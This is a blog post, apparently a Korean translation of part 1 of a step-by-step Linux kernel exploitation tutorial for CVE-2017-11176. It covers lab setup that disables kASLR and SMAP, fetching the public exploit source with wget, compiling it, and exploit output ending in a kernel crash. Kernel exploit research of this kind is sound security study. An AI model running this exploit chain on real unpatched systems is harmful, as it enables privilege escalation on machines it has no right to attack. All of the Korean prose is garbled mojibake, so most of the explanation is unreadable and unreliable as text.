---
layout: post
title:  "CVE-2017-11176 : í•œ ê±¸ìŒ í•œ ê±¸ìŒ ë¦¬ëˆ…ìŠ¤ ì»¤ë„ ìµìŠ¤í”Œë¡œì‡í•˜ê¸° (part 1/4)"
date:   2019-08-11 17:08:11 +0900
categories: ì·¨ì•½ì  ê³µë¶€
---
*LEXFOì˜ [CVE-2017-11176: A step-by-step Linux Kernel exploitation (part 1/4)](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html)ë¥¼ ë²ˆì—­í•œ ë¬¸ì„œì…ë‹ˆë‹¤. ë²ˆì—­ì´ ì• ë§¤í•œ ê²½ìš°ì—” ì›ë˜ì˜ ë‹¨ì–´ë¥¼ ì˜†ì— ì ì–´ë‘ì—ˆìŠµë‹ˆë‹¤.*

# ì†Œê°œ

ì´ ì‹œë¦¬ì¦ˆëŠ” CVE ì„¤ëª…ìœ¼ë¡œë¶€í„° í•œ ë‹¨ê³„ì”© ë¦¬ëˆ…ìŠ¤ ì»¤ë„ ìµìŠ¤í”Œë¡œì‡ì„ ë§Œë“¤ì–´ê°€ëŠ” ê³¼ì •ì„ ë‹´ê³  ìˆë‹¤. ë‹¨ê³„ì— ë”°ë¼ ì´ 4ê°œì˜ íŒŒíŠ¸ë¡œ ë‚˜ë‰œë‹¤. [part 1](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca)ì—ì„œ íŒ¨ì¹˜ë¥¼ ë¶„ì„í•˜ì—¬ ë²„ê·¸ì˜ ë‚´ìš©ì„ ì´í•´í•œ ë’¤ ê·¸ê²ƒì„ ì»¤ë„ ì˜ì—­(kernel land)ì—ì„œ íŠ¸ë¦¬ê±°í•œë‹¤. [part 2](https://chamalane.herokuapp.com/posts/5d5035f8c040080004228196)ì—ì„  ê·¸ê²ƒì„ í†µí•´ ë™ì‘í•˜ëŠ” PoC ì½”ë“œë¥¼ ë§Œë“ ë‹¤. ê·¸ë¦¬ê³  [part 3](https://chamalane.herokuapp.com/posts/5d503601c040080004228197)ì—ì„œ PoC ì½”ë“œë¥¼ arbitrary call primitiveë¡œ ë°”ê¾¼ ë’¤ ìµœì¢…ì ìœ¼ë¡œ [part 4](https://chamalane.herokuapp.com/posts/5d50360ac040080004228198)ì—ì„œ ë§ 0 ë ˆë²¨ì—ì„œ ì„ì˜ì ì¸ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ê²Œ ëœë‹¤.

ë§ì€ ì»¤ë„ ìµìŠ¤í”Œë¡œì‡ ë¬¸ì„œì—ì„œ ë…ìê°€ ì´ë¯¸ ì»¤ë„ ì½”ë“œì— ìµìˆ™í•˜ë‹¤ê³  ê°€ì •í•œë‹¤. í•˜ì§€ë§Œ ì´ ê¸€ì€ ì´ˆì‹¬ìë¥¼ ìœ„í•´ ì“°ì¸ ê¸€ë¡œ, ì¤‘ìš”í•œ ê°œë…ì„ ê°™ì´ ì„¤ëª…í•˜ì—¬ ê·¸ ê°„ê·¹ì„ ì¤„ì´ê¸° ìœ„í•´ ë…¸ë ¥í•˜ì˜€ë‹¤. ê¸€ì„ ë‹¤ ì½ì—ˆì„ ë• **ìµìŠ¤í”Œë¡œì‡ ì½”ë“œì˜ ëª¨ë“  ì¤„ì„ ì´í•´í•˜ê³ , ê·¸ê²ƒì´ ì»¤ë„ì— ì–´ë–»ê²Œ ì˜í–¥ì„ ë¯¸ì¹˜ëŠ”ì§€ ì•Œ ìˆ˜ ìˆì„ ê²ƒì´ë‹¤.**

í•œ ë¬¸ì„œì—ì„œ ëª¨ë“  ë‚´ìš©ì„ ë‹¤ë£° ìˆœ ì—†ì§€ë§Œ ì´ ë¬¸ì„œëŠ” ìµìŠ¤í”Œë¡œì‡ ê°œë°œì„ ìœ„í•´ ì•Œì•„ì•¼ í•˜ëŠ” ëª¨ë“  ì»¤ë„ ê²½ë¡œ(kernel path)ë¥¼ ì„¤ëª…í•˜ëŠ” ê²ƒì„ ëª©í‘œë¡œ í•œë‹¤. ì‹¤ìŠµìœ¼ë¡œ ë°°ìš°ëŠ” ë¦¬ëˆ…ìŠ¤ ì»¤ë„ ì—¬í–‰ì´ë¼ê³  ìƒê°í•˜ì. ìµìŠ¤í”Œë¡œì‡ ì½”ë“œë¥¼ ì‘ì„±í•´ë³´ëŠ” ê±´ ì»¤ë„ì„ ì´í•´í•˜ëŠ” ì•„ì£¼ ì¢‹ì€ ë°©ë²•ì´ë‹¤. ì¶”ê°€ë¡œ ë””ë²„ê¹… ê¸°ìˆ , íˆ´, ë¹ˆë²ˆí•˜ê²Œ ë‚˜ì˜¤ëŠ” ì• ë¡œ ì‚¬í•­ê³¼ ê·¸ê²ƒì„ í•´ê²°í•˜ëŠ” ë°©ë²•ì„ ë³¼ ê²ƒì´ë‹¤.

ì—¬ê¸°ì„œ ë‹¤ë£¨ëŠ” ì·¨ì•½ì ì€ "mq\_notify: double sock\_put()"ìœ¼ë¡œ ì•Œë ¤ì ¸ ìˆëŠ” [CVE-2017-11176](https://nvd.nist.gov/vuln/detail/CVE-2017-11176)ì´ë‹¤. ì´ ì·¨ì•½ì ì— ëŒ€í•œ íŒ¨ì¹˜ëŠ” 2017ë…„ ì¤‘ìˆœì— ëŒ€ë¶€ë¶„ì˜ ë¦¬ëˆ…ìŠ¤ ë°°í¬íŒì—ì„œ ì´ë£¨ì–´ì¡Œë‹¤. ì´ ë¬¸ì„œê°€ ì“°ì¸ ì‹œì ì—” ê³µê°œëœ ìµìŠ¤í”Œë¡œì‡ì´ ì—†ë‹¤.

ë¬¸ì„œì— ìˆ˜ë¡ëœ ì»¤ë„ ì½”ë“œëŠ” v2.6.32.x ë²„ì „ì˜ ì½”ë“œì´ê³ , 4.11.9. ë²„ì „ê¹Œì§€ ì·¨ì•½ì ì´ ì¡´ì¬í•œë‹¤. ì´ ë²„ì „ì´ ë„ˆë¬´ ì˜¤ë˜ ëœ ë²„ì „ì´ë¼ê³  ìƒê°í•  ìˆ˜ ìˆì§€ë§Œ ì•„ì§ ë§ì´ ì“°ì´ê³  ìˆê³ , ë¹„êµì  ì´í•´í•˜ê¸° ì‰½ë‹¤. ê·¸ë¦¬ê³  ì´ì „ ë²„ì „ì˜ ì½”ë“œë¥¼ ì•Œë©´ ìµœì‹  ì»¤ë„ ì½”ë“œì—ì„œ ê°™ì€ ë¶€ë¶„ì„ ì°¾ì•„ë‚´ê¸° ì‰½ë‹¤.

ì—¬ê¸°ì„œ ë§Œë“œëŠ” ìµìŠ¤í”Œë¡œì‡ ì½”ë“œëŠ” íƒ€ê²Ÿì´ ì •í•´ì ¸ ìˆì§€ ì•Šë‹¤. íŠ¹ì • íƒ€ê²Ÿì—ì„œ ì‘ë™í•˜ê²Œ í•˜ë ¤ë©´ ìˆ˜ì •(structure offsets/layout, gadgets, function addresses...)ì„ ì¢€ í•´ì•¼ í•œë‹¤. ìµìŠ¤í”Œë¡œì‡ì„ ê·¸ëŒ€ë¡œ ëŒë¦¬ë©´ ì‹œìŠ¤í…œì´ **ê³ ì¥ë‚  ê²ƒ**ì´ë‹ˆ ëŒë¦¬ì§€ ë§ì! ìµœì¢… ìµìŠ¤í”Œë¡œì‡ ì½”ë“œëŠ” [ì—¬ê¸°](https://github.com/lexfo/linux/blob/master/cve-2017-11176.c)ì—ì„œ ë°›ì„ ìˆ˜ ìˆë‹¤.

ì·¨ì•½í•œ ì»¤ë„ì˜ [ì†ŒìŠ¤ ì½”ë“œ](https://www.kernel.org/)ë¥¼ ë°›ì•„ì„œ ì­‰ ì½ì–´ë³´ëŠ” ê²ƒì„ ê¶Œì¥í•œë‹¤. ìµìŠ¤í”Œë¡œì‡ì„ êµ¬í˜„í•´ë³´ë©´ ë” ì¢‹ë‹¤. ì„ í˜¸í•˜ëŠ” [ì½”ë“œ í¬ë¡¤ë§](https://www.owasp.org/index.php/Crawling_Code) íˆ´ì„ ì¼œê³  ì´ì œ ì‹œì‘í•´ë³´ì!

**ì£¼ì˜**: ì´ ì‹œë¦¬ì¦ˆì˜ ë¶„ëŸ‰ì— ê²ë¨¹ì§€ ë§ì. ì½”ë“œê°€ ë§ì´ í¬í•¨ë˜ì–´ì„œ ê·¸ë ‡ë‹¤! ì»¤ë„ í•´í‚¹ì— ì…ë¬¸í•˜ë ¤ë©´ ë§ì€ ì½”ë“œì™€ ë¬¸ì„œë¥¼ ë³¼ ì¤€ë¹„ë¥¼ í•´ì•¼ í•œë‹¤. ì‹œê°„ì„ ë§ì´ íˆ¬ìí•˜ì.

**ë…¸íŠ¸**: *ìš°ë¦¬ê°€ ì´ CVEë¥¼ ë°œê²¬í•œ ê²ƒì€ ì•„ë‹ˆë‹¤. ê·¸ì € ì›ë°ì´ ìµìŠ¤í”Œë¡œì‡ì„ êµ¬í˜„í•œ ê²ƒì´ë‹¤.*

- - -

## ëª©ì°¨

* [ì¶”ì²œ ë„ì„œ](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca#recommended-reading)
* [í™˜ê²½ ì„¤ì •í•˜ê¸°](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca#lab-setup)
* [í•µì‹¬ ê°œë… #1](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca#core-concepts)
* [ê³µê°œëœ ì •ë³´](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca#public-information)
* [ë²„ê·¸ ì´í•´í•˜ê¸°](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca#understanding-the-bug)
* [Retry Logic ë„ë‹¬í•˜ê¸°](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca#reaching-the-retry-logic)
* [ê°•ì œë¡œ íŠ¸ë¦¬ê±°í•˜ê¸°](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca#forcing-the-trigger)
* [ê²°ë¡ ](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca#conclusion)
- - -
## <a name='recommended-reading'></a>ì¶”ì²œ ë„ì„œ

ì´ ê¸€ì€ ì»¤ë„ì˜ ì‘ì€ ë¶€ë¶„ë“¤ë§Œì„ ë‹¤ë£¬ë‹¤. ì•„ë˜ ì±…ë“¤ì„ ì½ì–´ë³´ë©´ ë„ì›€ì´ ë  ê²ƒì´ë‹¤(ì™„ì „ ì¢‹ë‹¤!) :

* Understanding the Linux Kernel (D. P. Bovet, M.Cesati)
* Understanding Linux Network Internals (C. Benvenuti)
* A guide to Kernel Exploitation: Attacking the Core (E. Perla, M. Oldani)
* Linux Device Drivers (J. Corbet, A. Rubini, G. Kroah-Hartman)
- - -
## <a name='lab-setup'></a>í™˜ê²½ ì„¤ì •í•˜ê¸°

**ì—…ë°ì´íŠ¸**: Thanks to readers feedbacks, this section has been updated (2018-10-22).

ì—¬ê¸° ì“°ì¸ ì½”ë“œëŠ” 2.6.32.x ë²„ì „ì—ì„œ ë‚˜ì˜¨ ì½”ë“œì´ë‹¤. ê·¸ëŸ¬ë‚˜, ì•„ë˜ ë‚˜ì˜¤ëŠ” íƒ€ê²Ÿì— ìµìŠ¤í”Œë¡œì‡ì„ ì‹¤í–‰í•´ë³´ê¸° ë°”ë€ë‹¤. ë³„ë¡œ ë°©í•´ê°€ ë˜ì§€ ì•ŠëŠ” ëª‡ ëª‡ ì°¨ì´ê°€ ì¡´ì¬í•  ê²ƒì´ë‹¤.

[Debian 8.6.0 (amd64) ISO](https://cdimage.debian.org/mirror/cdimage/archive/8.6.0-live/amd64/iso-hybrid/debian-live-8.6.0-amd64-standard.iso)

ì´ ISOëŠ” **3.16.36** ë²„ì „ì˜ ì»¤ë„ì„ ê¸°ë°˜ìœ¼ë¡œ í•œë‹¤. ìš°ë¦° í•´ë‹¹ ë²„ì „ì—ì„œë„ ë²„ê·¸ì— ë„ë‹¬í•˜ì—¬ ì»¤ë„ í¬ë˜ì‹œë¥¼ ì¼ìœ¼í‚¬ ìˆ˜ ìˆë‹¤ëŠ” ê²ƒë§Œ í™•ì¸í•˜ì˜€ë‹¤. ëŒ€ë¶€ë¶„ì˜ ë³€ê²½ì ì€ ìµìŠ¤í”Œë¡œì‡ì˜ ë§ˆì§€ë§‰ ë¶€ë¶„(part 3,4)ì—ì„œ ë“±ì¥í•œë‹¤.

ë²„ê·¸ê°€ ì—¬ëŸ¬ í™˜ê²½/êµ¬ì¡°ì—ì„œ ìµìŠ¤í”Œë¡œì‡ì´ ê°€ëŠ¥í•˜ì§€ë§Œ, ì•„ë˜ ìš”êµ¬ ì‚¬í•­ë“¤ì€ ì¶©ì¡±ë˜ì–´ì•¼ í•œë‹¤:

* ì»¤ë„ ë²„ì „ì´ 4.11.9ë³´ë‹¤ ë‚®ì„ ê²ƒ (4.x ë¯¸ë§Œì˜ ë²„ì „ì„ ì¶”ì²œí•¨)
* "amd64" (x86-64) ì•„í‚¤í…ì²˜ì—ì„œ êµ¬ë™ë  ê²ƒ
* ë””ë²„ê¹…ì„ ìœ„í•œ ë£¨íŠ¸ ê¶Œí•œ ë³´ìœ 
* ì»¤ë„ì—ì„œ SLAB allocatorë¥¼ ì‚¬ìš©í•  ê²ƒ
* SMEPì´ í™œì„±í™”ë˜ì–´ ìˆì„ ê²ƒ
* kASLRê³¼ SMAPì´ ë¹„í™œì„±í™”ë˜ì–´ ìˆì„ ê²ƒ
* ë©”ëª¨ë¦¬ê°€ 512MB ì´ìƒì¼ ê²ƒ
* CPU ìˆ˜ëŠ” ìƒê´€ì—†ì§€ë§Œ í•˜ë‚˜ë¡œë„ ì¶©ë¶„

**ì£¼ì˜**: ì œì‹œëœ íƒ€ê²Ÿ(Debian 8.6.0)ì˜ ì°¨ì´ì  ë•Œë¬¸ì— CPU ìˆ˜ë¥¼ í•˜ë‚˜ë¡œ ë§ì¶”ëŠ” ê²ƒì„ ê¶Œì¥í•œë‹¤. ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ ì¬í• ë‹¹(reallocation) ë‹¨ê³„ì—ì„œ í•´ì¤˜ì•¼ í•  ì¼ì´ ëŠ˜ì–´ë‚  ìˆ˜ ìˆë‹¤(part 3).

ì œì‹œëœ íƒ€ê²Ÿì˜ ê¸°ë³¸ í™˜ê²½ì€ ëª¨ë“  ìš”êµ¬ ì‚¬í•­ì„ ë§Œì¡±í•œë‹¤. ë‹¤ë¥¸ íƒ€ê²Ÿì—ì„œ ìµìŠ¤í”Œë¡œì‡ì„ í•˜ê³  ì‹¶ë‹¤ë©´ ë‹¤ìŒ ì„¹ì…˜ì„ ë³´ê¸¸ ë°”ë€ë‹¤.

SLAB/SMEP/SMAPì´ ë­”ì§€ ëª°ë¼ë„ ê±±ì •í•˜ì§€ ë§ì. [part 3](https://chamalane.herokuapp.com/posts/5d503601c040080004228197)ì™€ [part 4](https://chamalane.herokuapp.com/posts/5d50360ac040080004228198)ì—ì„œ ë‹¤ë£° ê²ƒì´ë‹¤.

**ì£¼ì˜**: ë””ë²„ê¹…ì„ ìš©ì´í•˜ê²Œ í•˜ê¸° ìœ„í•´ íƒ€ê²Ÿì„ ê°€ìƒ ë¨¸ì‹ ì—ì„œ ëŒë ¤ì•„ í•˜ëŠ”ë° *virtualbox*ëŠ” SMEPë¥¼ ì§€ì›í•˜ì§€ ì•ŠëŠ”ë‹¤(ê¸€ì´ ì“°ì¸ ì‹œì  ê¸°ì¤€). ë”°ë¼ì„œ *vmware*ì˜ ë¬´ë£Œ ë²„ì „ì´ë‚˜ SMEPë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ê°€ìƒí™” íˆ´ì„ ì‚¬ìš©í•´ì•¼ í•œë‹¤.

ì‹œìŠ¤í…œì´ **ì„¤ì¹˜ë˜ì—ˆìœ¼ë©´**(LiveCDë¥¼ ì´ìš©í•˜ì§€ ë§ ê²ƒ)  í™˜ê²½ ì„¤ì •ì´ ì˜ˆìƒëŒ€ë¡œ ë˜ì–´ìˆëŠ”ì§€ í™•ì¸í•´ì•¼ í•œë‹¤.

### Checking SLAB/SMEP/SMAP/KASLR Status

ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ í†µí•´ SMEPì˜ í™œì„±í™” ì—¬ë¶€ë¥¼ ì•Œì•„ë³´ì. "smep" ë¬¸ìì—´ì´ ì¡´ì¬í•´ì•¼ í•œë‹¤:

```bash
$ grep "smep" /proc/cpuinfo
flags   : [...] smep bmi2 invpcid
                ^--- this one
```

ë¬¸ìì—´ì´ ì¡´ì¬í•˜ì§€ ì•ŠëŠ”ë‹¤ë©´ **cat /proc/cmdline** ì— **nosmep** ë¬¸ìì—´ì´ í™•ì‹¤íˆ ì—†ëŠ”ì§€ í™•ì¸í•´ë¼. ë§Œì¼ ì¡´ì¬í•œë‹¤ë©´ **/etc/default/grub** íŒŒì¼ì—ì„œ ì•„ë˜ ê°’ë“¤ì„ ìˆ˜ì •í•´ì•¼ í•œë‹¤.

```plaintext
# /etc/default/grub
GRUB_CMDLINE_LINUX_DEFAULT="quiet"          // "nosmep"ì´ ì—†ì–´ì•¼ í•¨
GRUB_CMDLINE_LINUX="initrd=/install/initrd.gz"  // "nosmep"ì´ ì—†ì–´ì•¼ í•¨
```

ìˆ˜ì •í•œ í›„ **update-grub** ëª…ë ¹ì–´ë¥¼ ì…ë ¥í•˜ê³  ì‹œìŠ¤í…œì„ ì¬ë¶€íŒ…í•˜ë¼. ê·¸ëŸ° í›„ì—ë„ ì—¬ì „íˆ SMEPì´ ë¹„í™œì„±í™”ë˜ì–´ ìˆìœ¼ë©´(*/proc/cpuinfo*ë¥¼ ì²´í¬í•  ê²ƒ) ë‹¤ë¥¸ ê°€ìƒí™” íˆ´ì„ ì‚¬ìš©í•´ì•¼ í•œë‹¤.

SMAPì€ SMEPê³¼ ì •í™•íˆ ë°˜ëŒ€ë¡œ í•´ì•¼ í•œë‹¤. ë¨¼ì € grep ëª…ë ¹ì–´ë¡œ */proc/cpuinfo*ì—ì„œ "smep"ì„ ì°¾ëŠ”ë‹¤. ì•„ë¬´ê²ƒë„ ë‚˜ì˜¤ì§€ ì•ŠëŠ”ë‹¤ë©´ ì„¤ì •ì´ ì˜ ë˜ì–´ìˆëŠ” ê²ƒì´ë‹¤. ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ grub ì„¤ì • íŒŒì¼ì— "nosmap"ì„ ì¶”ê°€í•œ í›„ *update-grub*ì„ í•˜ê³  ì¬ë¶€íŒ…í•˜ì.

ì—¬ê¸°ì„œ ê°œë°œëœ ìµìŠ¤í”Œë¡œì‡ì€ "í•˜ë“œì½”ë”©ëœ" ì£¼ì†Œë¥¼ ì‚¬ìš©í•˜ë¯€ë¡œ kASLRì˜ ë¹„í™œì„±í™”ê°€ í•„ìˆ˜ì ì´ë‹¤. kASLRì€ ì»¤ë„ì— ëŒ€í•œ *ASLR*([Address Space Layout Randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization))ì´ë‹¤. ë¹„í™œì„±í™”ë¥¼ í•˜ë ¤ë©´ grub cmdlineì— **nokaslr** ì˜µì…˜ì„ ì¶”ê°€í•´ì•¼ í•œë‹¤(*nosmap*ê³¼ ë™ì¼). ìµœì¢…ì ìœ¼ë¡œ grub cmdlineì€ ë‹¤ìŒê³¼ ê°™ì€ ëª¨ìŠµì´ ëœë‹¤:

```plaintext
GRUB_CMDLINE_LINUX_DEFAULT="quiet nokaslr nosmap"
GRUB_CMDLINE_LINUX="initrd=/install/initrd.gz"
```

ë§ˆì§€ë§‰ìœ¼ë¡œ, íƒ€ê²Ÿì€ *SLAB* Allocatorë¥¼ ì‚¬ìš©í•´ì•¼ í•œë‹¤. ì»¤ë„ì´ SLABë¥¼ ì‚¬ìš©í•œë‹¤ëŠ” ê²ƒì„ ë‹¤ìŒ ë°©ë²•ìœ¼ë¡œ í™•ì¸í•  ìˆ˜ ìˆë‹¤:

```bash
$ grep "CONFIG_SL.B=" /boot/config-$(uname -r)
CONFIG_SLAB=y
```

**CONFIG_SLAB=y**ì—¬ì•¼ í•œë‹¤. ë°ë¹„ì•ˆì€ SLABì„ ê¸°ë³¸ìœ¼ë¡œ ì‚¬ìš©í•˜ëŠ” ë°˜ë©´ ìš°ë¶„íˆ¬ëŠ” SLUBë¥¼ ê¸°ë³¸ìœ¼ë¡œ ì‚¬ìš©í•œë‹¤. íƒ€ê²Ÿì´ SLABë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šê³  ìˆë‹¤ë©´ **ì»¤ë„ì„ ì¬ì»´íŒŒì¼í•´ì•¼ í•œë‹¤**. ë°°í¬íŒì˜ ë¬¸ì„œë¥¼ ì½ì–´ë³´ì.

ë‹¤ì‹œ ê°•ì¡°í•˜ì§€ë§Œ, ì œì‹œëœ íƒ€ê²Ÿì€ ëª¨ë“  ìš”êµ¬ ì‚¬í•­ì„ ë§Œì¡±í•˜ë¯€ë¡œ ë‹¤ ì˜ ë˜ì–´ìˆëŠ”ì§€ í™•ì¸ë§Œ í•˜ë©´ ëœë‹¤.

### Installing SystemTap

ì´ì „ì— ë§í–ˆë˜ ê²ƒì²˜ëŸ¼ íƒ€ê²Ÿì€ ìš°ë¦¬ê°€ ë‹¤ë£° ì·¨ì•½ì ì´ ìˆëŠ” *v3.16.36 (uname -v)* ì»¤ë„ì„ ê¸°ë°˜ìœ¼ë¡œ í•œë‹¤([v3.16.47](https://lwn.net/Articles/732094/)ì—ì„œ íŒ¨ì¹˜ë¨).

**ì£¼ì˜**: systemtap ì„¤ì¹˜ ì ˆì°¨ë¥¼ ê±°ì¹˜ë©´ ì»¤ë„ì´ ì—…ë°ì´íŠ¸ë  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ì ˆëŒ€ í•˜ì§€ ë§ì!

ì´ëŸ° ë¬¸ì œ ë•Œë¬¸ì— ë²„ì „ì— ë§ëŠ” *.deb* íŒ¨í‚¤ì§€ë¥¼ ìˆ˜ë™ìœ¼ë¡œ ì„¤ì¹˜í•´ì•¼ í•œë‹¤. í•„ìš”í•œ ê²ƒì€ ë‹¤ìŒê³¼ ê°™ë‹¤:

* linux-image-3.16.0-4-amd64_3.16.36-1+deb8u1_amd64.deb
* linux-image-3.16.0-4-amd64-dbg_3.16.36-1+deb8u1_amd64.deb
* linux-headers-3.16.0-4-amd64_3.16.36-1+deb8u1_amd64.deb

[ì´ ë§í¬](https://snapshot.debian.org/package/linux/3.16.36-1%2Bdeb8u1/)ì—ì„œ ë‹¤ìš´ë¡œë“œí•˜ê±°ë‚˜ ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ ì…ë ¥í•˜ì:

```bash
# wget https://snapshot.debian.org/archive/debian-security/20160904T172241Z/pool/updates/main/l/linux/linux-image-3.16.0-4-amd64_3.16.36-1%2Bdeb8u1_amd64.deb
# wget https://snapshot.debian.org/archive/debian-security/20160904T172241Z/pool/updates/main/l/linux/linux-image-3.16.0-4-amd64-dbg_3.16.36-1%2Bdeb8u1_amd64.deb
# wget https://snapshot.debian.org/archive/debian-security/20160904T172241Z/pool/updates/main/l/linux/linux-headers-3.16.0-4-amd64_3.16.36-1%2Bdeb8u1_amd64.deb
```

ê·¸ í›„ ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ í†µí•´ ì„¤ì¹˜í•˜ì:

```bash
# dpkg -i linux-image-3.16.0-4-amd64_3.16.36-1+deb8u1_amd64.deb
# dpkg -i linux-image-3.16.0-4-amd64-dbg_3.16.36-1+deb8u1_amd64.deb
# dpkg -i linux-headers-3.16.0-4-amd64_3.16.36-1+deb8u1_amd64.deb
```

ì„¤ì¹˜ë¥¼ ë§ˆì³¤ìœ¼ë©´ ì¬ë¶€íŒ…ì„ í•œ ë’¤ ë‹¤ìŒ ëª…ë ¹ì–´ë¡œ system tapì„ ì„¤ì¹˜í•˜ì:

```bash
# apt install systemtap
```

ë§ˆì§€ë§‰ìœ¼ë¡œ ë‹¤ ì˜ ë˜ì—ˆëŠ”ì§€ í™•ì¸í•´ë³´ì:

```plaintext
# stap -v -e 'probe vfs.read {printf("read performed\n"); exit()}'
stap: Symbol `SSL_ImplementedCiphers' has different size in shared object, consider re-linking
Pass 1: parsed user script and 106 library script(s) using 87832virt/32844res/5328shr/28100data kb, in 100usr/10sys/118real ms.
Pass 2: analyzed script: 1 probe(s), 1 function(s), 3 embed(s), 0 global(s) using 202656virt/149172res/6864shr/142924data kb, in 1180usr/730sys/3789real ms.
Pass 3: translated to C into "/tmp/stapWdpIWC/stap_1390f4a5f16155a0227289d1fa3d97a4_1464_src.c" using 202656virt/149364res/7056shr/142924data kb, in 0usr/20sys/23real ms.
Pass 4: compiled C into "stap_1390f4a5f16155a0227289d1fa3d97a4_1464.ko" in 6310usr/890sys/13392real ms.
Pass 5: starting run.
read performed                                      // <--------------
Pass 5: run completed in 10usr/20sys/309real ms.
```

### Last Minute Checks
##### Updated (2018-10-22)

system tap ì™¸ì—ë„ íƒ€ê²Ÿ ì»¤ë„ì€ ìµìŠ¤í”Œë¡œì‡ì„ ì»´íŒŒì¼í•˜ê³  ì‹¤í–‰í•˜ëŠ” ë° ì‚¬ìš©ë  ê²ƒì´ë‹¤. ê·¸ëŸ¬ë‹ˆ ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•˜ì:

```bash
# apt install binutils gcc
```

ê·¸ë¦¬ê³  [ìµìŠ¤í”Œë¡œì‡](https://github.com/lexfo/linux/blob/master/cve-2017-11176.c)ì„ ë‹¤ìŒ ëª…ë ¹ì–´ë¡œ ë‹¤ìš´ë¡œë“œí•˜ì:

```bash
$ wget https://raw.githubusercontent.com/lexfo/linux/master/cve-2017-11176.c
```

**ì œì‹œëœ íƒ€ê²Ÿê³¼ ë¬¸ì„œì—ì„œ ì‚¬ìš©í•˜ëŠ” íƒ€ê²Ÿì˜ ì°¨ì´ë¡œ ì¸í•´ ì—¬ê¸°ì„œ ì´ìš©ë˜ëŠ” "used-after-freed" ì˜¤ë¸Œì íŠ¸ëŠ” "kmalloc-1024"ê°€ ì•„ë‹Œ "kmalloc-2048" ìºì‹œì— ìˆë‹¤.** ë”°ë¼ì„œ ì•„ë˜ ë¼ì¸ì„ ìµìŠ¤í”Œë¡œì‡ì—ì„œ ìˆ˜ì •í•˜ì:

```c
define KMALLOC_TARGET 2048 // instead of 1024
```

ì´ëŠ” íƒ€ê²Ÿì´ ì •í•´ì§„ ìµìŠ¤í”Œë¡œì‡ì—ì„œ ë°œìƒí•˜ëŠ” ë¬¸ì œì ì´ë‹¤. part 3ë¥¼ ì½ìœ¼ë©´ ìˆ˜ì •í•œ ì´ìœ ë¥¼ ì•Œê²Œ ë  ê²ƒì´ë‹¤. ì´ì œ ìµìŠ¤í”Œë¡œì‡ì„ ë¹Œë“œí•˜ê³  ì‹¤í–‰í•´ë³´ì:

```bash
$ gcc -fpic -O0 -std=c99 -Wall -pthread cve-2017-11176.c -o exploit
$ ./exploit
[ ] -={ CVE-2017-11176 Exploit }=-
[+] successfully migrated to CPU#0
[+] userland structures allocated:
[+] g_uland_wq_elt = 0x120001000
[+] g_fake_stack   = 0x20001000
[+] ROP-chain ready
[ ] optmem_max = 20480
[+] can use the 'ancillary data buffer' reallocation gadget!
[+] g_uland_wq_elt.func = 0xffffffff8107b6b8
[+] reallocation data initialized!
[ ] initializing reallocation threads, please wait...
[+] 200 reallocation threads ready!
[+] reallocation ready!
[+] 300 candidates created
[+] parsing '/proc/net/netlink' complete
[+] adjacent candidates found!
[+] netlink candidates ready:
[+] target.pid = -4590
[+] guard.pid  = -4614
[ ] preparing blocking netlink socket
[+] receive buffer reduced
[ ] flooding socket
[+] flood completed
[+] blocking socket ready
[+] netlink fd duplicated (unblock_fd=403, sock_fd2=404)
[ ] creating unblock thread...
[+] unblocking thread has been created!
[ ] get ready to block
[ ][unblock] closing 576 fd
[ ][unblock] unblocking now
[+] mq_notify succeed
[ ] creating unblock thread...
[+] unblocking thread has been created!
[ ] get ready to block
[ ][unblock] closing 404 fd
[ ][unblock] unblocking now
[ 55.395645] Freeing alive netlink socket ffff88001aca5800
[+] mq_notify succeed
[+] guard socket closed
[ 60.399964] general protection fault: 0000 [#1] SMP
... cut (other crash dump info) ...

<<< HIT CTRL-C >>>
```

íƒ€ê²Ÿì´ ë‹¤ë¥´ê¸° ë•Œë¬¸ì— ìµìŠ¤í”Œë¡œì‡ì— ì‹¤íŒ¨í•˜ê³  ë£¨íŠ¸ ê¶Œí•œë„ ì–»ì§€ ëª» í–ˆë‹¤. part 3 ê³¼ 4ë¥¼ ë³´ë©´ ì•Œê² ì§€ë§Œ ìˆ˜ì •ì´ í•„ìš”í•˜ë‹¤. ê·¸ëŸ¬ë‚˜ ë°©ê¸ˆì˜ ê²°ê³¼ëŠ” ìš°ë¦¬ê°€ ë²„ê·¸ì— ë„ë‹¬í•  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ì…ì¦í•´ì¤€ë‹¤.

